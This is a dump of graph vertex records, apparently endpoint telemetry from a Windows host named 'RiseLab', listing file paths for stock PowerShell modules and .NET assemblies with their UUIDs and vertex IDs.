+Key: name, Value: \\Device\\HarddiskVolume2\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\Pester.psd1
+Key: uuid, Value: F79A8C47-7B26-4811-AA9C-8A8660B0FD82
+Vertex ID: 338911
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Program Files\\WindowsPowerShell\\Modules\\Pester\\3.4.0\\Pester.psm1
+Key: uuid, Value: B53170BD-4E3B-477B-A0C0-6AF051F120D6
+Vertex ID: 338912
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Program Files\\WindowsPowerShell\\Modules\\PowerShellGet\\1.0.0.1\\PowerShellGet.psd1
+Key: uuid, Value: D9AF16D9-4112-45AB-ACAC-C64DBEA3CE73
+Vertex ID: 338913
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Program Files\\WindowsPowerShell\\Modules\\PowerShellGet\\1.0.0.1\\PSModule.psm1
+Key: uuid, Value: 0935C23E-84E6-4D77-B0A9-B594AEC952AA
+Vertex ID: 338918
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\1.2\\PSReadline.psd1
+Key: uuid, Value: DBF3D8C3-7B07-4BB0-B340-41FE73EAF2E4
+Vertex ID: 338919
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1
+Key: uuid, Value: 1F31476A-5242-40CF-95AA-F7B165E91DC9
+Vertex ID: 46167
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.P521220ea#\\c2c1ce153341a9c8ac66880c03caa532\\Microsoft.PowerShell.Commands.Utility.ni.dll.aux
+Key: uuid, Value: 3FA9B26C-00F0-42D3-A20B-8FCF30959DE3
+Vertex ID: 46165
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Confe64a9051#\\9aba7ff42298fa6e1520ba2324076714\\System.Configuration.Install.ni.dll.aux
+Key: uuid, Value: 022A410E-F006-482A-8E11-66E8BFFAD850
+Vertex ID: 338920
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1
+Key: uuid, Value: 1CB8C313-079C-417D-83A7-BC9D7AE0F248
+Vertex ID: 46043
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Dired13b18a9#\\0477afcfdccc24502c8e79e7f6ce45c7\\System.DirectoryServices.ni.dll
+Key: uuid, Value: 03A01573-10CE-4B95-9C32-AB63CE90C8B8
+Vertex ID: 338922
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\Microsoft.PowerShell.Management.psd1
+Key: uuid, Value: DFF9E527-98F6-4E97-8D8B-88EFFA752A39
+Vertex ID: 338923
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AppBackgroundTask\\AppBackgroundTask.psd1
+Key: uuid, Value: 0658F483-EDC0-4AC8-AF1B-0A785398E0B1
+Vertex ID: 338924
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AppLocker\\AppLocker.psd1
+Key: uuid, Value: 70349AC6-6690-4133-89C4-6295E2A08F87
+Vertex ID: 338927
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AppvClient\\AppvClient.psd1
+Key: uuid, Value: 10B24BF5-2B21-414D-9E5B-AC4D27DB4760
+Vertex ID: 46118
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_64\\System.Transactions\\v4.0_4.0.0.0__b77a5c561934e089\\System.Transactions.dll
+Key: uuid, Value: 6EC180FD-5FC5-4A27-A2CD-22171921A85D
+Vertex ID: 46176
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.M870d558a#\\7314cf7eded390fc44889f576e76a5a9\\Microsoft.Management.Infrastructure.Native.ni.dll.aux
+Key: uuid, Value: 24735D4C-16A0-480B-B3F5-9F2A5C59AD2B
+Vertex ID: 338930
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.M870d558a#\\7314cf7eded390fc44889f576e76a5a9\\Microsoft.Management.Infrastructure.Native.ni.dll
+Key: uuid, Value: BDAE1EBA-D025-405E-B967-1E9922272973
+Vertex ID: 338929
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AppvClient\\Microsoft.AppV.AppVClientPowerShell.dll
+Key: uuid, Value: FD690006-B40B-4AE1-AB32-7A5DD40BB88D
+Vertex ID: 338933
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_64\\Microsoft.AppV.AppvClientComConsumer\\v4.0_10.0.0.0__31bf3856ad364e35\\Microsoft.AppV.AppvClientComConsumer.dll
+Key: uuid, Value: 73B4FAFB-8159-446D-A566-6C4A9646E0EB
+Vertex ID: 338935
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Appx\\Appx.psd1
+Key: uuid, Value: E1A2FAF9-9CA5-4637-AA84-0E67965FF3A7
+Vertex ID: 338936
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AssignedAccess\\AssignedAccess.psd1
+Key: uuid, Value: 2A9FF666-D3B6-43F5-834C-290113581613
+Vertex ID: 338937
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitLocker\\BitLocker.psd1
+Key: uuid, Value: 29FCC6F3-B2AD-4920-9013-E284DC9DB981
+Vertex ID: 338940
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitLocker\\en-US\\BitLocker.psd1
+Key: uuid, Value: 63A36334-06F8-42C7-97FC-391DBE7AE8DD
+Vertex ID: 338943
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitLocker\\Microsoft.BitLocker.Structures.dll
+Key: uuid, Value: D235CA1A-9E0C-4450-892D-144326DFBBCA
+Vertex ID: 338947
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitLocker\\BitLocker.psm1
+Key: uuid, Value: 35AB8861-49AB-4F04-9216-AC5DE385B2D7
+Vertex ID: 46057
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Numerics\\f0215d4d9a67d23d8769d37aede1226f\\System.Numerics.ni.dll
+Key: uuid, Value: BB360A7D-30E5-469E-ADF7-573C8C288B8E
+Vertex ID: 338948
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BitsTransfer\\BitsTransfer.psd1
+Key: uuid, Value: 4718DBB5-64AA-46F4-8F43-009BAA20B9A4
+Vertex ID: 338949
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\BranchCache\\BranchCache.psd1
+Key: uuid, Value: D5B16F0C-18F8-4EA0-9909-8EEE81555BF8
+Vertex ID: 338950
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\CimCmdlets\\CimCmdlets.psd1
+Key: uuid, Value: 94392015-A644-4625-B18A-2DBC1D6D2FA9
+Vertex ID: 338951
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\ConfigCI\\ConfigCI.psd1
+Key: uuid, Value: FAF6284C-0208-47EF-9F25-EA5D1E245347
+Vertex ID: 338952
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Defender\\Defender.psd1
+Key: uuid, Value: 15FC6245-92A0-478F-9390-32D68BB92E79
+Vertex ID: 338953
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\DeliveryOptimization\\DeliveryOptimization.psd1
+Key: uuid, Value: 5B2B9F09-8CD4-428D-8F86-902C8055ACFA
+Vertex ID: 338954
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\DirectAccessClientComponents\\DirectAccessClientComponents.psd1
+Key: uuid, Value: CA28ABEE-255D-40B5-A518-AE14C395F778
+Vertex ID: 338955
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Dism\\Dism.psd1
+Key: uuid, Value: A6A36F6A-39FA-4057-A673-0FC21AB4149B
+Vertex ID: 338956
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\DnsClient\\DnsClient.psd1
+Key: uuid, Value: 75C52DBF-A2C6-42F5-8C22-5704381B4E0E
+Vertex ID: 338957
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\EventTracingManagement\\EventTracingManagement.psd1
+Key: uuid, Value: 32B749D2-A0D8-4EEB-8602-4D46AFDC92E0
+Vertex ID: 338964
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\EventTracingManagement\\MSFT_EtwTraceSession_v1.0.cdxml
+Key: uuid, Value: 1DCD3A80-FFDC-4CD8-ADC1-4BC29EE8C50B
+Vertex ID: 46168
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pae3498d9#\\92829a11a674202dc6169d5db19b41ec\\Microsoft.PowerShell.Commands.Management.ni.dll.aux
+Key: uuid, Value: DD8B06FC-6030-4F52-ADC2-144F075FB9F5
+Vertex ID: 338965
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\EventTracingManagement\\MSFT_EtwTraceProvider_v1.0.cdxml
+Key: uuid, Value: 91770694-2E97-43F9-A9C5-AE48EF512B33
+Vertex ID: 338966
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\EventTracingManagement\\MSFT_AutologgerConfig_v1.0.cdxml
+Key: uuid, Value: E6E00EE8-9A27-4457-AAD4-F22F5FA514DB
+Vertex ID: 338967
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\International\\International.psd1
+Key: uuid, Value: DE453FA3-897B-4913-A85E-6016F31BE538
+Vertex ID: 338970
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\iSCSI\\iSCSI.psd1
+Key: uuid, Value: E1E266EE-7E64-4328-80E5-1817913D4855
+Vertex ID: 338971
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Kds\\Kds.psd1
+Key: uuid, Value: 9A60497C-3868-4946-B23B-80C00E728858
+Vertex ID: 46174
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Kd58820a5#\\36fca1df14f0b13bd6780ccf62339a0d\\Microsoft.KeyDistributionService.Cmdlets.ni.dll.aux
+Key: uuid, Value: DACF1BB6-BAA9-4682-B3D5-2D86571C965B
+Vertex ID: 338974
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\assembly\\GAC_64\\Microsoft.KeyDistributionService.Cmdlets\\v4.0_10.0.0.0__31bf3856ad364e35\\Microsoft.KeyDistributionService.Cmdlets.dll
+Key: uuid, Value: D0EC7D62-4069-476D-B614-3BF00EA33862
+Vertex ID: 338977
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\KdsCli.dll
+Key: uuid, Value: 52CA11D6-F9D1-4F88-8F7A-050EB3A3966F
+Vertex ID: 338978
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Archive\\Microsoft.PowerShell.Archive.psd1
+Key: uuid, Value: EF7F5918-A40E-4440-A044-5233BD40B639
+Vertex ID: 338979
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Diagnostics\\Microsoft.PowerShell.Diagnostics.psd1
+Key: uuid, Value: 1B5DA0CC-0A41-474C-888C-53D94534C2FC
+Vertex ID: 338980
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Host\\Microsoft.PowerShell.Host.psd1
+Key: uuid, Value: F76B84B5-E96F-462D-9236-A85F6134DA88
+Vertex ID: 338981
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.LocalAccounts\\1.0.0.0\\Microsoft.PowerShell.LocalAccounts.psd1
+Key: uuid, Value: CA3D075F-6741-4153-ADC1-03AAAD0BAB73
+Vertex ID: 338983
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.LocalAccounts\\1.0.0.0\\Microsoft.PowerShell.LocalAccounts.dll
+Key: uuid, Value: DA24F41B-2F44-479F-AB87-984A50406B86
+Vertex ID: 338984
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.ODataUtils\\Microsoft.PowerShell.ODataUtils.psd1
+Key: uuid, Value: 296CE1C9-FB4C-42EB-BFC2-D997AA1BAD1C
+Vertex ID: 338985
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Security\\Microsoft.PowerShell.Security.psd1
+Key: uuid, Value: F8E01674-5A53-4C03-8EA8-D063CBE05ECA
+Vertex ID: 338986
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.WSMan.Management\\Microsoft.WSMan.Management.psd1
+Key: uuid, Value: 3DA12232-879C-4815-B0A9-EC116C1CCCEE
+Vertex ID: 338987
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MMAgent\\MMAgent.psd1
+Key: uuid, Value: 66463701-FE16-4CC7-A5ED-15130842958B
+Vertex ID: 338988
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MsDtc.psd1
+Key: uuid, Value: B4E698C6-EFB7-4230-A3EB-10C24713981C
+Vertex ID: 338992
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcTask_v1.0.cdxml
+Key: uuid, Value: C777F569-76FC-4B80-BF78-0D0086250287
+Vertex ID: 338993
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcLogTask_v1.0.cdxml
+Key: uuid, Value: D5FBA4CB-1B04-4EA2-80C4-3B7730C0CDAF
+Vertex ID: 338994
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcAdvancedHostSettingTask_v1.0.cdxml
+Key: uuid, Value: 321B7423-C8A6-4334-A206-C6BB5684633C
+Vertex ID: 338995
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcAdvancedSettingTask_v1.0.cdxml
+Key: uuid, Value: D71E9612-3A56-45A5-B2DE-BEFC4A78BB4B
+Vertex ID: 338996
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcClusterDefaultTask_v1.0.cdxml
+Key: uuid, Value: 4982076D-1E5B-441B-AFF2-A168FE54139A
+Vertex ID: 338997
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcDefaultTask_v1.0.cdxml
+Key: uuid, Value: 1066FFA7-6DB0-462E-9DA0-EE19EBB2EB50
+Vertex ID: 338998
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcNetworkSettingTask_v1.0.cdxml
+Key: uuid, Value: A4F3842E-28F2-4714-9D71-5182405C1FB7
+Vertex ID: 338999
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcTransactionTask_v1.0.cdxml
+Key: uuid, Value: FEC2D14D-C3F0-4766-88F2-42E18068FF08
+Vertex ID: 339000
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcTransactionsStatisticsTask_v1.0.cdxml
+Key: uuid, Value: 0A631533-AD8F-4F14-B3D3-D245C163E63E
+Vertex ID: 339001
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcTransactionsTraceSessionTask_v1.0.cdxml
+Key: uuid, Value: BBC48E99-71E1-441E-A6B9-86A3B8EC0105
+Vertex ID: 339002
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcClusterTMMappingTask_v1.0.cdxml
+Key: uuid, Value: 04A20917-60D0-4B4A-A32F-BD95C0B22D1D
+Vertex ID: 339003
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\MsDtc\\MSFT_DtcTransactionsTraceSettingTask_v1.0.cdxml
+Key: uuid, Value: 49BDE269-2078-4F0B-93B0-EF104245CB48
+Vertex ID: 339005
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetAdapter\\NetAdapter.psd1
+Key: uuid, Value: A06E101A-E9BF-4555-A9B2-DB6C7C7603A9
+Vertex ID: 339006
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetConnection\\NetConnection.psd1
+Key: uuid, Value: 1DE35F93-C5D8-41D3-A295-BBAC7939BA17
+Vertex ID: 339010
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetConnection\\MSFT_NetConnectionProfile.cdxml
+Key: uuid, Value: 2500E98E-6522-46C0-BFCA-321105575B25
+Vertex ID: 339011
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetEventPacketCapture\\NetEventPacketCapture.psd1
+Key: uuid, Value: 9CF1789B-6B04-411B-8799-839D1B341758
+Vertex ID: 339012
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetLbfo\\NetLbfo.psd1
+Key: uuid, Value: 18AB8440-4369-4357-BC92-0FC39EB8CB57
+Vertex ID: 339013
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetNat\\NetNat.psd1
+Key: uuid, Value: 89C5F6C9-25BB-449A-8500-583CFEB6C0E3
+Vertex ID: 339016
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetNat\\MSFT_NetNat.cdxml
+Key: uuid, Value: 3B197BF4-A036-4A79-AF6C-CEA79A911F28
+Vertex ID: 339017
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetNat\\MSFT_NetNatExternalAddress.cdxml
+Key: uuid, Value: CFC209F9-AED7-4755-BF86-FD76468234A6
+Vertex ID: 339018
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetNat\\MSFT_NetNatStaticMapping.cdxml
+Key: uuid, Value: 66DBA11E-19B7-48F7-A1CB-3E319E78B5B9
+Vertex ID: 339019
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetNat\\MSFT_NetNatSession.cdxml
+Key: uuid, Value: 472F949F-54AE-48F1-9A0D-E853BEC9D459
+Vertex ID: 339020
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetNat\\MSFT_NetNatGlobal.cdxml
+Key: uuid, Value: A5E50AC0-A90C-4C9F-B885-50704101FE13
+Vertex ID: 339021
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetQos\\NetQos.psd1
+Key: uuid, Value: 5FFCFC0A-326F-42B6-BA08-2DD305BC1BDD
+Vertex ID: 339024
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\NetQos\\MSFT_NetQosPolicy.cdxml
